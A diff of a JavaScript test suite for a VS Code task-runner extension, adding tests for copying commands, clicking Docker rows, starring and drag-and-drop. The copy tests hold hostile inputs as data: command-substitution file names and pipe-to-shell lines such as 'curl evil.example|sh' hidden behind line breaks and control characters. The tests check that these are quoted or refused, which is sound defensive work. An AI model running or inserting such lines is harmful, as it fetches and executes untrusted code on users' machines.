@@ -143,6 +143,15 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
       }
     },
     TaskScope: { Workspace: 1 },
+    // What a drag writes and a drop reads back: the payload, as a string.
+    DataTransferItem: class {
+      constructor(value) {
+        this.value = value;
+      }
+      asString() {
+        return Promise.resolve(this.value);
+      }
+    },
     ConfigurationTarget: { Global: 'global', Workspace: 'workspace', WorkspaceFolder: 'folder' },
     // Both of the real one's shapes: a program and its arguments, or a whole
     // command line and its options — the second is how a custom task runs.
@@ -284,7 +293,7 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     // The real one waits fifteen seconds on a task that will not die. The
     // harness gives that answer straight away, either way round.
     stopExecution = async (execution) => (stopped.push(execution), ${stops});
-    exports.tree = { startScript, restartNode, clearance, approveLaunch, createCustomTask, editCustomTask, deleteCustomTask, renameCustomTask, editTitle, buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS, manifestRef, starDropped, saveOrder, migrateShellBuckets, migrateSubfolderRefs, foldedRefs };
+    exports.tree = { startScript, restartNode, clearance, approveLaunch, createCustomTask, editCustomTask, deleteCustomTask, renameCustomTask, editTitle, buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, copyCommandOf, activateNode, setFavorite, dragAndDropController, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS, manifestRef, starDropped, saveOrder, migrateShellBuckets, migrateSubfolderRefs, foldedRefs };
   `,
     Object.assign(context, { memento, extUri: uri('/ext'), stopped }),
   );
@@ -770,6 +779,74 @@ test('Add to Terminal has nothing to open for a row that is not a script', async
   await h.addToTerminal(h.buildTreeRoots([script('/repo/package.json', 'dev', 'npm')])[0]);
   await h.addToTerminal(undefined);
   assert.deepEqual(h.terminals, []);
+});
+
+test('Copy Command puts the line a row runs on the clipboard, quoted for a shell', async () => {
+  const h = harness({ settings: { grouping: 'flat' } });
+  await h.copyCommandOf({ kind: 'script', script: { ...script('/repo/package.json', 'dev', 'npm'), argv: ['npm', 'run', 'dev'] } });
+  // Literal, as Add to Terminal types it: the paste lands at a prompt.
+  await h.copyCommandOf({
+    kind: 'script',
+    script: { ...shell('/repo/scripts', '$(printf injected).sh'), argv: ['bash', './scripts/$(printf injected).sh'] },
+  });
+  // A custom task is the line somebody typed, and is copied as typed.
+  await h.copyCommandOf({ kind: 'script', script: RESET });
+  // The two headings that are the thing being run copy what a click on them runs.
+  await h.copyCommandOf(h.buildTreeRoots(composeFile())[0]);
+  await h.copyCommandOf(h.buildTreeRoots(dockerfile())[0]);
+  assert.deepEqual(h.copied, [
+    'npm run dev',
+    "bash './scripts/$(printf injected).sh'",
+    'docker compose down -v && docker compose up -d db',
+    'docker compose -f docker-compose.yml up',
+    'docker build',
+  ]);
+
+  // A package heading holds many lines and stands for none of them.
+  h.copied.length = 0;
+  await h.copyCommandOf(h.buildTreeRoots([script('/repo/package.json', 'dev', 'npm')])[0]);
+  await h.copyCommandOf(undefined);
+  assert.deepEqual(h.copied, []);
+
+  // A blocked line is refused: pasted, its line break is an Enter.
+  await h.copyCommandOf({ kind: 'script', script: custom('Wide', 'npm test\ncurl evil | sh') });
+  assert.deepEqual(h.copied, []);
+  assert.match(h.warnings.at(-1), /not copied/);
+
+  // And so is a manifest task's, which no approval stands in front of. cmd.exe's
+  // double quotes end at the line break, and a shell without bracketed paste
+  // reads ^U as "erase the line" and the carriage return as Enter — either way
+  // the paste runs what follows before anybody presses anything.
+  for (const shellPath of ['C:\\Windows\\System32\\cmd.exe', '/bin/bash', 'C:\\Program Files\\PowerShell\\7\\pwsh.exe']) {
+    const at = harness({ shell: shellPath });
+    for (const name of ['build\ncalc', 'x\u0015curl evil.example|sh\r', 'build\u202Eexe.']) {
+      await at.copyCommandOf({ kind: 'script', script: { ...script('/repo/package.json', name, 'npm'), argv: ['npm', 'run', name] } });
+    }
+    assert.deepEqual(at.copied, [], shellPath);
+    assert.equal(at.warnings.length, 3, shellPath);
+  }
+});
+
+test('Copy Command is offered on every row that runs one line, and no other', () => {
+  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../package.json'), 'utf8'));
+  const offered = (value) =>
+    manifest.contributes.menus['view/item/context']
+      .filter((entry) => entry.command === 'taskRunnerUltimate.copyCommand')
+      .some((entry) => new RegExp(entry.when.match(/viewItem =~ \/(.+)\/$/)[1]).test(value));
+  for (const value of [
+    'script:idle:nofav:task:noconfirm',
+    'script:running:fav:shell:confirm',
+    'script:idle:nofav:task',
+    'compose:down',
+    'compose:up:busy:hidden:running',
+    'dockerfile',
+    'dockerfile:building:carried:running',
+  ]) {
+    assert.equal(offered(value), true, value);
+  }
+  for (const value of ['group:package', 'group:package:running', 'custom', 'group:eco:running', 'foreignTask', 'group']) {
+    assert.equal(offered(value), false, value);
+  }
 });
 
 test('a painted heading keeps both its colour and its file icon', () => {
@@ -2034,6 +2111,229 @@ test('▶ on a Dockerfile builds it, and ■ ends what is running', async () => 
   assert.deepEqual([...h.launched].map((task) => task.definition.script), ['build']);
 });
 
+test('a click on a compose file or a Dockerfile starts it, or goes to what of it runs', async () => {
+  // The click is whatever command the row was drawn with, handed what it was
+  // drawn with — which is what the workbench does with it.
+  const click = (h, heading) => {
+    const { command, arguments: args } = h.treeItemFor(heading).command;
+    assert.equal(command, 'taskRunnerUltimate.toggleItem');
+    return h.activateNode(...args, true);
+  };
+  const scripts = (h) => [...h.launched].map((task) => task.definition.script);
+
+  // Nothing running: the file's own action, the one ▶ starts.
+  const idle = harness({ settings: { grouping: 'flat' } });
+  await click(idle, idle.buildTreeRoots(composeFile())[0]);
+  await click(idle, idle.buildTreeRoots(dockerfile())[0]);
+  assert.deepEqual(scripts(idle), ['up', 'build']);
+  // And the output comes up with it, as a click on a task row brings it up —
+  // where ▶ leaves the panel where it was.
+  assert.deepEqual(idle.launched.map((task) => task.presentationOptions.reveal), [1, 1]);
+
+  // Something of the file's running — here the container `run` started, which
+  // is not the build — is not a reason to build again: the click goes to it.
+  const rows = dockerfile();
+  const container = {
+    task: { name: 'run', definition: { type: 'taskRunnerUltimate', script: 'run', manifest: rows[2].manifest.toString() } },
+  };
+  const busy = harness({ settings: { grouping: 'flat' }, executions: [container], liveKeys: true });
+  busy.running.set(rows[2].key, container);
+  await click(busy, busy.buildTreeRoots(rows)[0]);
+  assert.deepEqual(scripts(busy), []);
+  // A handle the task system no longer lists is not something running.
+  const stale = harness({ settings: { grouping: 'flat' }, liveKeys: true });
+  stale.running.set(rows[2].key, container);
+  await click(stale, stale.buildTreeRoots(rows)[0]);
+  assert.deepEqual(scripts(stale), ['build']);
+
+  // A stack in the pile is not brought up by a click, as ▶ is not offered there:
+  // put away, it is out of the way until the eye takes it out. Idle, the row has
+  // no click at all; with a run of ours under it, the click still finds it.
+  const stack = composeFile();
+  const pile = harness({ settings: { grouping: 'flat' }, scan: stack, stored: { hidden: ['file:///repo/docker-compose.yml'] } });
+  const walk = (nodes) => nodes.flatMap((n) => [n, ...(n.kind === 'group' && !n.source ? walk(n.children) : [])]);
+  const hidden = walk(pile.buildTreeRoots(stack)).find((n) => n.source === 'docker-compose');
+  assert.equal(pile.treeItemFor(hidden).contextValue, 'compose:down:hidden');
+  assert.equal(pile.treeItemFor(hidden).command, undefined);
+  await pile.activateNode(hidden, true);
+  // Carried into the pile with its project is put away all the same.
+  const carried = { ...idle.buildTreeRoots(stack)[0], carried: true };
+  assert.equal(idle.treeItemFor(carried).command, undefined);
+  await idle.activateNode(carried, true);
+  assert.deepEqual(scripts(pile), []);
+  assert.deepEqual(scripts(idle), ['up', 'build']);
+  const service = {
+    task: { name: 'up: web', definition: { type: 'taskRunnerUltimate', script: 'up: web', manifest: stack[1].manifest.toString() } },
+  };
+  const following = harness({
+    settings: { grouping: 'flat' },
+    scan: stack,
+    stored: { hidden: ['file:///repo/docker-compose.yml'] },
+    executions: [service],
+    liveKeys: true,
+  });
+  following.running.set(stack[1].key, service);
+  const busyPile = walk(following.buildTreeRoots(stack)).find((n) => n.source === 'docker-compose');
+  await click(following, busyPile);
+  assert.deepEqual(scripts(following), []);
+  // A Dockerfile in the pile still builds: its menu offers Build there, so the
+  // click does nothing the row did not already offer.
+  const image = dockerfile();
+  const shelf = harness({ settings: { grouping: 'flat' }, scan: image, stored: { hidden: ['file:///repo/Dockerfile'] } });
+  await click(shelf, walk(shelf.buildTreeRoots(image)).find((n) => n.source === 'dockerfile'));
+  assert.deepEqual(scripts(shelf), ['build']);
+
+  // A package heading keeps its click for the fold, and a stray invocation with
+  // one is not a run of anything.
+  const npm = harness({ settings: { grouping: 'flat' } });
+  const pkg = npm.buildTreeRoots([script('/repo/package.json', 'dev', 'npm')])[0];
+  assert.equal(npm.treeItemFor(pkg).command, undefined);
+  await npm.activateNode(pkg, true);
+  assert.deepEqual(scripts(npm), []);
+});
+
+test('a compose file and a Dockerfile are starred as their own up and build, and drawn as the file', async () => {
+  const stack = composeFile();
+  const image = dockerfile('/repo/api/Dockerfile');
+  const scan = [...stack, ...image];
+  const h = harness({ settings: { grouping: 'flat' }, scan });
+  const heading = (source) => h.buildTreeRoots(scan).find((n) => n.source === source && !n.inFavorites);
+
+  // ☆ on the row files the action the row stands for: the store stays a list of
+  // script refs, and a star an older version put on `up` reads as the same one.
+  await h.setFavorite(heading('docker-compose'), true);
+  await h.setFavorite(heading('dockerfile'), true);
+  assert.deepEqual([...h.memento.data.favorites], ['file:///repo/docker-compose.yml::up', 'file:///repo/api/Dockerfile::build']);
+
+  // At the top in flat mode, as the file itself: a leaf with the file's own
+  // buttons, not a task row called `up`.
+  const roots = h.buildTreeRoots(scan);
+  const [compose, docker] = roots;
+  assert.deepEqual([compose.id, docker.id], ['fav:group:file:///repo/docker-compose.yml', 'fav:group:file:///repo/api/Dockerfile']);
+  const item = h.treeItemFor(compose);
+  assert.equal(item.id, compose.id);
+  assert.equal(item.collapsibleState, 0);
+  assert.equal(item.contextValue, 'compose:fav:down');
+  assert.equal(h.treeItemFor(docker).contextValue, 'dockerfile:fav');
+  // And the row below it says it is starred too.
+  assert.equal(h.treeItemFor(heading('docker-compose')).contextValue, 'compose:fav:down');
+
+  // Its click is the file's click.
+  await h.activateNode(...item.command.arguments, true);
+  assert.deepEqual([...h.launched].map((task) => task.definition.script), ['up']);
+
+  // ★ on the copy takes the star off the file, and the copy goes.
+  await h.setFavorite(compose, false);
+  assert.deepEqual([...h.memento.data.favorites], ['file:///repo/api/Dockerfile::build']);
+  assert.equal(h.buildTreeRoots(scan).some((n) => n.id === compose.id), false);
+
+  // Under the Favorites heading in ecosystem mode, the same row.
+  const nested = harness({ settings: { grouping: 'ecosystem' }, scan, stored: { favorites: ['file:///repo/docker-compose.yml::up'] } });
+  const [favorites] = nested.buildTreeRoots(scan);
+  assert.equal(favorites.id, 'group:favorites');
+  assert.equal(nested.treeItemFor(favorites.children[0]).contextValue, 'compose:fav:down');
+
+  // Any other action of the file is still the task row an older version starred.
+  const legacy = harness({ settings: { grouping: 'flat' }, scan, stored: { favorites: ['file:///repo/api/Dockerfile::run'] } });
+  const [run] = legacy.buildTreeRoots(scan);
+  assert.equal(run.kind, 'script');
+  assert.equal(run.script.name, 'run');
+});
+
+test('a starred stack in the pile is drawn among the starred rows as not put away', async () => {
+  const stack = composeFile();
+  const h = harness({
+    settings: { grouping: 'flat' },
+    scan: stack,
+    stored: { hidden: ['file:///repo/docker-compose.yml'], favorites: ['file:///repo/docker-compose.yml::up'] },
+  });
+  const roots = h.buildTreeRoots(stack);
+  const walk = (nodes) => nodes.flatMap((n) => [n, ...(n.kind === 'group' && !n.source ? walk(n.children) : [])]);
+  const [starred] = roots;
+  const away = walk(roots).find((n) => n.source === 'docker-compose' && !n.inFavorites);
+  // Starring it is what brought it up here, so the copy is a row like any
+  // starred one — ▶ and a click included — and the one in the pile stays put away.
+  assert.equal(h.treeItemFor(starred).contextValue, 'compose:fav:down');
+  assert.equal(h.treeItemFor(away).contextValue, 'compose:fav:down:hidden');
+  await h.activateNode(starred, true);
+  assert.deepEqual([...h.launched].map((task) => task.definition.script), ['up']);
+});
+
+test('a starred compose file or Dockerfile moves among the starred rows, and no heading is placed by it', async () => {
+  const stack = composeFile();
+  const image = dockerfile('/repo/api/Dockerfile');
+  const npm = script('/repo/web/package.json', 'dev', 'npm');
+  const scan = [...stack, ...image, npm];
+  const h = harness({
+    settings: { grouping: 'flat' },
+    scan,
+    stored: { favorites: ['file:///repo/docker-compose.yml::up', 'file:///repo/web/package.json::dev', 'file:///repo/api/Dockerfile::build'] },
+  });
+  const [compose, dev, docker] = h.buildTreeRoots(scan);
+  const written = new Map();
+  const transfer = { set: (mime, item) => written.set(mime, item), get: (mime) => written.get(mime) };
+
+  // Dragged, the copy carries the starred list's scope and the ref it is filed as.
+  h.dragAndDropController.handleDrag([compose], transfer);
+  assert.deepEqual(JSON.parse(written.get('application/vnd.code.tree.taskrunnerultimate.tree').value), {
+    scope: '::favorites',
+    refs: ['file:///repo/docker-compose.yml::up'],
+  });
+  // Dropped on the starred Dockerfile below, it takes that one's place.
+  await h.dragAndDropController.handleDrop(docker, transfer);
+  assert.deepEqual([...h.memento.data.favorites], [
+    'file:///repo/web/package.json::dev',
+    'file:///repo/api/Dockerfile::build',
+    'file:///repo/docker-compose.yml::up',
+  ]);
+  // And a starred task dropped on a starred file is placed by it the same way.
+  written.clear();
+  h.dragAndDropController.handleDrag([dev], transfer);
+  await h.dragAndDropController.handleDrop(compose, transfer);
+  assert.deepEqual([...h.memento.data.favorites], [
+    'file:///repo/api/Dockerfile::build',
+    'file:///repo/docker-compose.yml::up',
+    'file:///repo/web/package.json::dev',
+  ]);
+
+  // A heading dropped on a starred copy is not reordered to where the copy is
+  // drawn: that is the starred list's place, not the heading's.
+  written.clear();
+  const original = h.buildTreeRoots(scan).find((n) => n.source === 'dockerfile' && !n.inFavorites);
+  h.dragAndDropController.handleDrag([original], transfer);
+  await h.dragAndDropController.handleDrop(compose, transfer);
+  assert.equal(h.memento.data.groupOrder, undefined);
+  assert.match(h.hints.at(-1), /Not a drop target/);
+});
+
+test('the star on a compose file or a Dockerfile is offered on every shape of the row, and nothing else is lost', () => {
+  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../package.json'), 'utf8'));
+  const offered = (command, value) =>
+    manifest.contributes.menus['view/item/context']
+      .filter((entry) => entry.command === `taskRunnerUltimate.${command}` && !entry.group.startsWith('inline'))
+      .some((entry) => new RegExp(entry.when.match(/viewItem =~ \/(.+)\/$/)[1]).test(value));
+  for (const value of ['compose:down', 'compose:up:busy:hidden:running', 'dockerfile', 'dockerfile:building:carried:running']) {
+    assert.equal(offered('addFavorite', value), true, value);
+    assert.equal(offered('removeFavorite', value), false, value);
+    const starred = value.replace(/^(compose|dockerfile)/, '$1:fav');
+    assert.equal(offered('addFavorite', starred), false, starred);
+    assert.equal(offered('removeFavorite', starred), true, starred);
+  }
+  // A starred row keeps every entry it had unstarred.
+  for (const command of ['stopStack', 'runGroup', 'composeActions', 'openManifest', 'copyCommand', 'copyPath', 'editTitle', 'hideGroup', 'pickColor']) {
+    assert.equal(offered(command, 'compose:fav:down'), true, command);
+  }
+  for (const command of ['buildImage', 'dockerfileActions', 'restartDockerfile', 'stopDockerfile', 'openManifest', 'copyCommand', 'hideGroup']) {
+    assert.equal(offered(command, 'dockerfile:fav:running'), true, command);
+  }
+  assert.equal(offered('showGroup', 'compose:fav:down:hidden'), true);
+  // And no other heading takes a star.
+  for (const value of ['group:package', 'group:package:running', 'custom', 'group:eco', 'group:favorites', 'foreignTask']) {
+    assert.equal(offered('addFavorite', value), false, value);
+    assert.equal(offered('removeFavorite', value), false, value);
+  }
+});
+
 test('a Dockerfile row carries no confirmation toggle, and no flag on it survives', async () => {
   // The same rule compose has, and for the same reason: the file is one leaf, so
   // there is no row to hang the toggle on and no way back off once it is on.
@@ -2199,11 +2499,14 @@ test('▶ is the last inline action on the rows read off a file, which is the ri
       .map((entry) => entry.command.replace('taskRunnerUltimate.', ''));
 
   // A stack Docker reports as up, with no run of ours behind it: ■ takes it
-  // down, ▶ runs `up` again over it.
-  assert.deepEqual(drawn('compose:up'), ['stopStack', 'runGroup']);
+  // down, ▶ runs `up` again over it. ☆ leads, in the column it holds on a task
+  // row, and is ★ once the file is starred.
+  assert.deepEqual(drawn('compose:up'), ['addFavorite', 'stopStack', 'runGroup']);
+  assert.deepEqual(drawn('compose:fav:up'), ['removeFavorite', 'stopStack', 'runGroup']);
   // A Dockerfile with something of ours alive under it — a `run` container, say
   // — is the whole set at once: restart, stop, the rest behind ☰, and a rebuild.
   assert.deepEqual(drawn('dockerfile:running'), [
+    'addFavorite',
     'restartDockerfile',
     'stopDockerfile',
     'dockerfileActions',
@@ -2211,13 +2514,14 @@ test('▶ is the last inline action on the rows read off a file, which is the ri
   ]);
   // Its own build running is the one thing that takes ▶ away; ■ and ☰ stay.
   assert.deepEqual(drawn('dockerfile:building:running'), [
+    'addFavorite',
     'restartDockerfile',
     'stopDockerfile',
     'dockerfileActions',
   ]);
-  // In the pile it is the eye that comes first, and it has the row's left-hand
-  // slot to itself — ▶ is not offered there at all.
-  assert.deepEqual(drawn('dockerfile:hidden'), ['showGroup', 'dockerfileActions']);
+  // In the pile the eye comes right after the star — ▶ is not offered there at
+  // all.
+  assert.deepEqual(drawn('dockerfile:hidden'), ['addFavorite', 'showGroup', 'dockerfileActions']);
 
   // The point of the numbers above, stated once as the rule they exist for: on a
   // row the tree read off a file, ▶ is the last action drawn, and a row with no ▶
@@ -2229,6 +2533,8 @@ test('▶ is the last inline action on the rows read off a file, which is the ri
     ['compose:up', 'runGroup'],
     ['dockerfile', 'buildImage'],
     ['dockerfile:running', 'buildImage'],
+    ['compose:fav:down', 'runGroup'],
+    ['dockerfile:fav:running', 'buildImage'],
     ['script:idle:fav:task:noconfirm', 'runItem'],
     ['script:running:fav:task:noconfirm', 'stopItem'],
   ]) {
